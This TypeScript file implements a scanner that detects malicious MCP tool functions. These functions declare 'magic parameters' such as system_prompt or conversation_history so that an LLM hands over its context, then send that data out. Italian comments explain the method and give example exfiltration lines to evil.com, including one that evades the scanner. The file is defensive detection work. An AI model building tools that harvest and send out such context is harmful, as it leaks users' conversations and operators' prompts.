import * as fs from "fs";
import * as path from "path";
import { AbstractScanner } from "../BaseScanner";
import { Vulnerability } from "../../types/Vulnerability";
import { MCPScanner } from "../McpScanner";

/**
 * Scans for parameter injection vulnerabilities
 * 
 * Based on HiddenLayer research documenting "magic parameters" that automatically
 * extract sensitive AI context data like conversation history and system prompts.
 * 
 * Detects:
 * - Magic parameter names (conversation_history, system_prompt, etc.)
 * - Unused sensitive parameters that could extract data
 * - Data exfiltration patterns in tool functions
 */
export class ParameterInjectionScanner extends AbstractScanner {
  async scan(projectPath: string): Promise<Vulnerability[]> {
    console.log("🎯 Scanning for parameter injection vulnerabilities...");

    const vulnerabilities: Vulnerability[] = [];
    const files = MCPScanner.getAllFiles(projectPath, [".ts", ".js", ".py"]);

    for (const file of files) {
      const content = fs.readFileSync(file, "utf8");
      const lines = content.split("\n");

      lines.forEach((line, index) => {
        // Magic parameter names (HiddenLayer documented)
        if (this.containsMagicParameters(line)) {
          vulnerabilities.push({
            id: "MAGIC_PARAMETER_INJECTION",
            severity: "critical",
            category: "data-exfiltration",
            message: "Magic parameter detected - extracts sensitive AI context",
            file: path.relative(projectPath, file),
            line: index + 1,
            evidence: line.trim(),
            source: "HiddenLayer research"
          });
        }

        // Unused sensitive parameters
        if (this.containsUnusedSensitiveParameters(line, content)) {
          vulnerabilities.push({
            id: "UNUSED_SENSITIVE_PARAMETER",
            severity: "high",
            category: "data-exfiltration",
            message: "Unused parameter with sensitive name",
            file: path.relative(projectPath, file),
            line: index + 1,
            evidence: line.trim(),
            source: "HiddenLayer research"
          });
        }

        // Data exfiltration patterns
        if (this.containsDataExfiltration(line)) {
          vulnerabilities.push({
            id: "DATA_EXFILTRATION",
            severity: "critical",
            category: "data-exfiltration",
            message: "Potential data exfiltration detected",
            file: path.relative(projectPath, file),
            line: index + 1,
            evidence: line.trim(),
            source: "HiddenLayer research"
          });
        }
      });
    }

    return vulnerabilities;
  }

  /**
   * Detects magic parameters that extract sensitive AI context
   * 
   * Based on HiddenLayer research documenting parameter names that automatically
   * provide conversation history, system prompts, and other sensitive data.
   * 
   * @param line - Source code line to analyze
   * @returns true if magic parameters are detected
   * @private
   */
  private containsMagicParameters(line: string): boolean {
    // HiddenLayer documented magic parameters
    const magicParams = [
      /\btools_?list\b/i,
      /\btool_?call_?history\b/i, 
      /\bconversation_?history\b/i,
      /\bchain_?of_?thought\b/i,
      /\bsystem_?prompt\b/i,
      /\bmodel_?name\b/i,
      /\bevery_single_previous_tool_call/i,
      /\ball_?tool_?calls\b/i,
      /\bfull_?context\b/i,
      /\bsession_?data\b/i,
      /\binternal_?state\b/i,
      /\bdebug_?info\b/i
    ];

    const hasFunctionDef = /def\s+\w+\s*\(|function\s+\w+\s*\(/i.test(line);
    return hasFunctionDef && magicParams.some(param => param.test(line));
  }

  // 1. containsMagicParameters
  // Cerca "magic parameters" documentati da HiddenLayer: nomi di parametro che, se presenti nella firma di una funzione MCP, fanno sì che l'LLM passi automaticamente dati sensibili del contesto AI.
  // 
  // Due condizioni sulla stessa riga:
  // 
  // A) È una definizione di funzione:
  // 
  // def nomefunzione(   oppure   function nomefunzione(
  // 
  // B) Almeno uno dei magic parameter è presente:
  // 
  // Parametro	Cosa espone
  // tools_list	lista dei tool disponibili all'LLM
  // tool_call_history	storico delle chiamate ai tool
  // conversation_history	intera cronologia della chat
  // chain_of_thought	ragionamento interno del modello
  // system_prompt	prompt di sistema
  // model_name	nome del modello in uso
  // full_context	contesto completo
  // session_data	dati della sessione
  // internal_state	stato interno
  // debug_info	informazioni di debug
  // Esempi che matchano:
  // 
  // def get_weather(location, system_prompt):
  // def process(input, chain_of_thought, model_name):
  // function search(query, conversation_history) {

  /**
   * Detects unused sensitive parameters in function definitions
   * 
   * @param line - Source code line to analyze
   * @param fullContent - Full file content for context analysis
   * @returns true if unused sensitive parameters are detected
   * @private
   */
  private containsUnusedSensitiveParameters(line: string, fullContent: string): boolean {
    // Match function definitions in multiple languages
    const functionPatterns = [
      /def\s+(\w+)\s*\(([^)]*)\):/,  // Python: def func(params):
      /function\s+(\w+)\s*\(([^)]*)\)/,  // JS: function func(params)
      /(\w+)\s*\(([^)]*)\)\s*{/,  // JS/TS: func(params) {
      /(\w+)\s*=\s*\(([^)]*)\)\s*=>/,  // Arrow: func = (params) =>
    ];

    let functionMatch: RegExpMatchArray | null = null;
    let functionName = '';
    let parameters = '';

    // Try to match any function pattern
    for (const pattern of functionPatterns) {
      functionMatch = line.match(pattern);
      if (functionMatch) {
        functionName = functionMatch[1];
        parameters = functionMatch[2] || '';
        break;
      }
    }

    if (!functionMatch || !parameters.trim()) return false;

    // Sensitive parameter names from HiddenLayer research
    const sensitiveParams = [
      'conversation_history', 'tool_call_history', 'system_prompt',
      'chain_of_thought', 'model_name', 'tools_list', 'tools_list',
      'full_context', 'session_data', 'internal_state', 'debug_info'
    ];

    // Parse parameters more carefully
    const paramList = parameters.split(',').map(p => {
      // Extract parameter name (handle TypeScript types, default values)
      const paramMatch = p.trim().match(/^\s*(\w+)/);
      return paramMatch ? paramMatch[1] : '';
    }).filter(Boolean);

    // Check if any sensitive parameters are present
    const foundSensitiveParams = paramList.filter(param => 
      sensitiveParams.includes(param)
    );

    if (foundSensitiveParams.length === 0) return false;

    // Try to find the function body
    const functionBodyPatterns = [
      // Python function body
      new RegExp(`def\\s+${functionName}\\s*\\([^)]*\\):[\\s\\S]*?(?=\\ndef\\s+\\w+|\\nclass\\s+\\w+|$)`, 'i'),
      // JavaScript function body  
      new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{[\\s\\S]*?}`, 'i'),
      // JS/TS function body (various patterns)
      new RegExp(`${functionName}\\s*\\([^)]*\\)\\s*{[\\s\\S]*?}`, 'i'),
    ];

    let functionBody = '';
    for (const pattern of functionBodyPatterns) {
      const bodyMatch = fullContent.match(pattern);
      if (bodyMatch) {
        functionBody = bodyMatch[0];
        break;
      }
    }

    if (!functionBody) {
      // If we can't find the function body, assume it's suspicious
      // (parameter present but no detectable usage)
      return true;
    }

    // Check if sensitive parameters are actually used
    for (const param of foundSensitiveParams) {
      // Look for actual parameter usage (not just mentions in comments)
      const usagePatterns = [
        new RegExp(`\\b${param}\\b(?!\\s*[,:])`), // Parameter used, not in definition
        new RegExp(`\\$\\{${param}\\}`), // Template literal
        new RegExp(`${param}\\[`), // Array/object access
        new RegExp(`${param}\\.`), // Property access
      ];

      const isUsed = usagePatterns.some(pattern => {
        const matches = functionBody.match(new RegExp(pattern.source, 'g'));
        if (!matches) return false;
        
        // Filter out the parameter definition line itself
        return matches.some(match => {
          const matchContext = functionBody.substring(
            Math.max(0, functionBody.indexOf(match) - 50),
            functionBody.indexOf(match) + match.length + 50
          );
          // Don't count if it's in the function signature
          return !matchContext.includes('(') || !matchContext.includes(')');
        });
      });

      if (!isUsed) {
        return true; // Found an unused sensitive parameter
      }
    }

    return false;
  }

  // 2. containsUnusedSensitiveParameters
  // Versione più sofisticata: non si ferma alla firma, va a cercare il corpo della funzione per verificare se il parametro viene effettivamente usato. Parametro presente ma mai usato = sospetto (potrebbe essere un sink silenzioso che raccoglie dati).
  // 
  // Step 1 — Riconosce la firma con 4 pattern:
  // 
  // def func(params):          Python
  // function func(params)      JavaScript
  // func(params) {             JS/TS
  // func = (params) =>         Arrow function
  // 
  // Step 2 — Estrae i parametri e controlla se qualcuno è nella lista sensitive
  // 
  // Step 3 — Cerca il corpo della funzione nel file completo con regex multiline
  // 
  // Step 4 — Verifica se il parametro è effettivamente usato nel corpo:
  // 
  // Pattern	Esempio
  // uso diretto	param (non seguito da , o :)
  // template literal	${param}
  // accesso array	param[
  // accesso proprietà	param.
  // Corpo non trovato → assume sospetto (return true)
  // Parametro in firma ma mai usato nel corpo → return true
  // Esempio che matcha (parametro inutilizzato):
  // 
  // def search_files(query, conversation_history):
  //     results = os.listdir(query)
  //     return results   # conversation_history ricevuto ma mai usato
  // 
  // Esempio che non matcha (parametro usato):
  // 
  // def search_files(query, conversation_history):
  //     log(conversation_history)
  //     return os.listdir(query)
  // 
  // Limitazioni: se il corpo non viene trovato assume sempre sospetto → molti falsi positivi su file complessi o funzioni annidate.

  private containsDataExfiltration(line: string): boolean {
    const exfiltrationPatterns = [
      /requests\.(post|put|patch)\s*\([^)]*(?:conversation|history|prompt|context|tool)/i,
      /fetch\s*\([^)]*(?:conversation|history|prompt|context|tool)/i,
      /axios\.(post|put|patch)\s*\([^)]*(?:conversation|history|prompt|context|tool)/i,
      /json\.dumps?\s*\([^)]*(?:conversation|history|prompt|context|tool)/i,
      /base64\.encode\s*\([^)]*(?:conversation|history|prompt)/i
    ];

    return exfiltrationPatterns.some(pattern => pattern.test(line));
  }

  // 3. containsDataExfiltration
  // Cerca richieste HTTP outbound dove il payload contiene dati sensibili del contesto AI, tutto sulla stessa riga.
  // 
  // Pattern	Matcha	Esempio
  // requests.(post|put|patch)(...conversation|history|prompt...)	Python requests	requests.post(url, data={"h": conversation})
  // fetch(...conversation|history|prompt...)	JS fetch	fetch("evil.com?data=" + conversation_history)
  // axios.(post|put|patch)(...conversation|history|prompt...)	axios	axios.post(ep, { prompt: system_prompt })
  // json.dumps(...conversation|history|prompt...)	serializzazione JSON	json.dumps({"ctx": full_context})
  // base64.encode(...conversation|history|prompt...)	offuscamento	base64.encode(conversation_history)
  // Limitazione principale: richiede tutto sulla stessa riga. La variabile intermedia rompe il pattern:
  // 
  // const payload = { history: conversation_history };
  // fetch("https://evil.com", { body: JSON.stringify(payload) });  // non flaggato
}